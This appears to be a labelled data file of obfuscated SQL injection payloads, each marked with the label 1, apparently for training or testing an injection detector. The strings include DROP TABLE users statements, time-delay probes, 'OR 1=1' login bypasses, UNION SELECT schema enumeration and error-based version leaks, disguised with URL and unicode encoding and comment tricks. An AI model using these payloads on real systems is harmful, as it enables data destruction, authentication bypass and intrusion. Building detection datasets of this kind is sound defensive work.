";DRO%50TAB%4cEus%65rs;", 1
"--#d2qtvm5q9%62khkzw", 1
"--", 1
"WAITFOR %44ELAY '0:0:%35'-%2d", 1
"; Se%6cECt PG_SLEEp(5)%3b %2d-", 1
"%27OREXISTS(SELECT1", 1
"%u0027%u0020OR%u0020%u00271%u0027LIKE%u00271", 1
"%u0027%u0020oR%u0020%u00271%u0027%3D%u00271", 1
"TEsT%25U0027%25U0020or%25U0020%25U00271%25u0027%3d%25U00271%25U0027%25U0020%2F%2A", 1
"/*%0a*/", 1
"admin%u0027%u0020OR%u0020%u00271%u0027=%u00271", 1
"--", 1
"1%u0020AND%u00201=1", 1
"%u0027UNIONSELECT", 1
"AdMiN%25U0027%25u0020oR%25u0020%25u00271%25u0027%3D%25u00271", 1
";/**/DROP TABLE users; ----x6j4aiat", 1
"WAITFORDELAY", 1
"1AND1=1", 1
"wAitFOR dEla%59 '0:0%3a5'%2d-", 1
"%u0027%u0020OR%u0020%u00271%u0027=%u00271", 1
"test%25u0027OR%250d%250a%25u00271%25u0027%3D%25u00271%25u0027%2F%2A%250d%250a", 1
"WAITFORDELAY", 1
"1'/**//**//**//**//**//**//**//**//**//**/AND/**//**//**//**//**//**//**//**//**//**/substring(database(),/**//**//**//**//**//**//**//**//**//**/1,/**//**//**//**//**//**//**//**//**//**/1)/**//**//**//**//**//**//**//**//**//**/%09=/**//**//**//**//**//**//**//**//**//**//**//**/'s'/**//**//**//**//**//**//**//**//**//**//**//**//**//**//**//**//**//**//**//**/OR/**//**//**//**//**//**//**//**//**//**/(1)--", 1
"test%25u0027%25u0020OR%25u0020%25u00271%25u0027%3D%25u00271%25u0027%25u0020%2F%2A", 1
"test%u0027%u0020||%u0020%u00271%u0027IN%u0020(1)%u00271%u0027%u0020/*", 1
"; DROP TABLE u%73er%73; -%2d", 1
";/*!12345%2a/S%45LECT pg_sle%65p(5); %2d-", 1
";/**/DROP TABLE users; --", 1
";/*!*/droP TAbLe uSErS; --", 1
"admin%u0027%u0020OR%u0020%u00271%u0027  =  %u00271", 1
"--", 1
";%20DROP%20T%41BLE%20users;%20%2d-", 1
"#w63gf", 1
"%u0027%u0020OR%u0020%u00271%u0027%3D%u00271", 1
"extractvalue(1,concat(0x5c,version()))--/*%0a*/", 1
"'OREXISTS(SELECT1", 1
";/*!*/  DROP   TABLE   users;   --", 1
"%u0027UnIOn", 1
";%u0020SELECT%u0020pg_sl%65ep(%35);%u0020%2d-", 1
"; SE%4cECT %70g_sleep(5);  OR%20'b'='b'%2d-", 1
"%u0027%u0020UN%2f*!1%32345*/ION%u0020SELECT%u00201%2c2,%33-%2d", 1
"--%0d%0a", 1
"'OR1 =	1", 1
"--", 1
"admin%25u0027%25u0020OR%25u0020%25u00271%25u0027%253D%25u00271", 1
"WAItFOR D%65lay '%30:0:5'-%2d", 1
"/*/*%0a*/", 1
"AdmIn%u0027%u0020OR%u0020%u00271%u0027=%u00271", 1
";/*!12345*/DROP TABLE users; --", 1
"1%u0027%u0020%55%4eION%u0020SELECT%u0020table_name,%u0020null,%u0020%6eu%6cl%u0020FROM%u0020in%66%6frmation_schema.tabl%65s%u0020-%2d%u0020OR%u0020%u0027b%u0027=%u0027b%u0027", 1
"admin%u0027%u0020||%u0020%u00271%u0027%3D%u00271", 1
";S%45LECT%2f*%0d%0a*%2fpg_sle%65p(5);", 1
"'/**//**//**/A/*!*/ND/**//**//**/extractvalue(1,concat(0x5c,version()))--", 1
";%20DROP%20TABLE%20%75sers;%20-%2d", 1
"--", 1
"/*%0a*/", 1
";%20DROP%20TABLE%2%30%75sers;%20%20/*!%2a/%41ND%201%3D1-%2d", 1
"1))UNIONSELECT", 1
"--", 1
"extractvalue(1,concat(0x5c,version()))--", 1
"WAITFORDELAY", 1
"admin%25u0027%25u0020OR%25u0020%25u00271%25u0027%3D%25u00271", 1
"'XOR", 1
"#obsisz7m6a2pev", 1
"1%u0020AND%u00201 =	1", 1
